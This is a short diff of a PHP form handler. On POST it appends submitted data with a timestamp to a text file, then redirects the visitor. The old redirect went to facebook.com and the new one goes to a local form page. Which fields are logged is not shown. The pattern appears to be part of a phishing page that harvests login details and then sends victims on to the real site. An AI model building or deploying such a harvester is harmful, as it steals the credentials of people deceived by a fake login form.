@@ -14,7 +14,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $pkt_time = date('Y-m-d H:i:s'); // Format the time as needed
 
         // Create or open the user.txt file for writing
-        $file = fopen("user4.txt", "a"); // "a" means append to the file
+        $file = fopen("user.txt", "a"); // "a" means append to the file
 
         if ($file) {
             // Write the data to the file
@@ -28,7 +28,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             fclose($file);
 
             // Perform the redirection to the new link
-            header("Location: https://www.facebook.com/"); // Replace with your desired URL
+            header("Location: form.html"); // Replace with your desired URL
             exit(); // Ensure that no further output is sent
         } else {
             // Error handling if the file cannot be opened
